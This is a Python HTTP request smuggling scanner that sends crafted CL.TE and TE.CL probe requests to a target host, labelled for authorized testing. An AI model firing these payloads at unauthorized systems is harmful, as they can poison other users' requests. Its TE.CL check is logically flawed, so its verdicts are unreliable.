#!/usr/bin/env python3
"""
Smuggler — HTTP Request Smuggling Detection Tool
Tests for CL.TE and TE.CL request smuggling via timing and differential response analysis.
Author: Omar Khalid (amooryx) | github.com/amooryx/smuggler
AUTHORIZED USE ONLY — for authorized security testing and bug bounty.
"""

import argparse
import json
import socket
import sys
import time

def send_raw(host: str, port: int, data: bytes, ssl_ctx=None, timeout: float = 15) -> bytes:
    """Send raw bytes and return response."""
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        if ssl_ctx:
            import ssl as ssl_mod
            sock = ssl_ctx.wrap_socket(sock, server_hostname=host)
        sock.sendall(data)
        response = b""
        sock.settimeout(timeout)
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break
        sock.close()
        return response
    except Exception as ex:
        return b"ERROR: " + str(ex).encode()

# ─── CL.TE probe ──────────────────────────────────────────────────────────────
def cl_te_probe(host: str, port: int, path: str, use_ssl: bool, timeout: float) -> dict:
    """
    CL.TE: Front-end uses Content-Length, back-end uses Transfer-Encoding.
    We send a request where CL says body is 4 bytes but TE body leaves 'G' in the pipe.
    A follow-up GET that returns 'GPOST /' (405) indicates smuggling.
    """
    req1 = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "G"
    ).encode()

    req2 = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode()

    ssl_ctx = None
    if use_ssl:
        import ssl as ssl_mod
        ssl_ctx = ssl_mod.create_default_context()
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode    = ssl_mod.CERT_NONE

    start = time.time()
    resp1 = send_raw(host, port, req1 + req2, ssl_ctx, timeout)
    elapsed = time.time() - start
    resp1_str = resp1.decode(errors="ignore")

    smuggled = "GPOST" in resp1_str or "405" in resp1_str.split("\r\n")[0]
    return {
        "technique": "CL.TE",
        "vulnerable": smuggled,
        "elapsed": round(elapsed, 2),
        "response_snippet": resp1_str[:200],
        "note": "GPOST method in response indicates CL.TE smuggling" if smuggled else "No CL.TE detected",
    }

# ─── TE.CL probe ──────────────────────────────────────────────────────────────
def te_cl_probe(host: str, port: int, path: str, use_ssl: bool, timeout: float) -> dict:
    """
    TE.CL: Front-end uses Transfer-Encoding, back-end uses Content-Length.
    The extra bytes after the terminating chunk are treated as a new request body by the back-end.
    """
    body = "0\r\n\r\nG"
    req1 = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
        + body
    ).encode()

    req2 = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode()

    ssl_ctx = None
    if use_ssl:
        import ssl as ssl_mod
        ssl_ctx = ssl_mod.create_default_context()
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode    = ssl_mod.CERT_NONE

    start = time.time()
    resp  = send_raw(host, port, req1 + req2, ssl_ctx, timeout)
    elapsed = time.time() - start
    resp_str = resp.decode(errors="ignore")

    smuggled = "GPOST" in resp_str or ("400" in resp_str.split("\r\n")[0] and elapsed > timeout * 0.8)
    return {
        "technique": "TE.CL",
        "vulnerable": smuggled,
        "elapsed": round(elapsed, 2),
        "response_snippet": resp_str[:200],
        "note": "Potential TE.CL smuggling detected" if smuggled else "No TE.CL detected",
    }

def main():
    parser = argparse.ArgumentParser(
        description="Smuggler — HTTP Request Smuggling Detection (Authorized use only)",
    )
    parser.add_argument("host",        help="Target host")
    parser.add_argument("--port",      type=int, default=443, help="Target port")
    parser.add_argument("--path",      default="/", help="URL path to test")
    parser.add_argument("--no-ssl",    action="store_true", help="Disable SSL")
    parser.add_argument("--timeout",   type=float, default=15)
    parser.add_argument("--out",       help="Output JSON file")
    args = parser.parse_args()

    use_ssl = not args.no_ssl
    print(f"[*] HTTP Request Smuggling: {args.host}:{args.port}{args.path} (ssl={use_ssl})")
    print("[!] AUTHORIZED USE ONLY")

    results = []

    print("[*] Testing CL.TE ...")
    cl_te = cl_te_probe(args.host, args.port, args.path, use_ssl, args.timeout)
    results.append(cl_te)
    flag = "[!!!] VULNERABLE" if cl_te["vulnerable"] else "[OK]"
    print(f"  {flag} CL.TE: {cl_te['note']} (elapsed: {cl_te['elapsed']}s)")

    print("[*] Testing TE.CL ...")
    te_cl = te_cl_probe(args.host, args.port, args.path, use_ssl, args.timeout)
    results.append(te_cl)
    flag = "[!!!] VULNERABLE" if te_cl["vulnerable"] else "[OK]"
    print(f"  {flag} TE.CL: {te_cl['note']} (elapsed: {te_cl['elapsed']}s)")

    if args.out:
        with open(args.out, "w") as f:
            json.dump(results, f, indent=2)
        print(f"[*] Results → {args.out}")

if __name__ == "__main__":
    main()
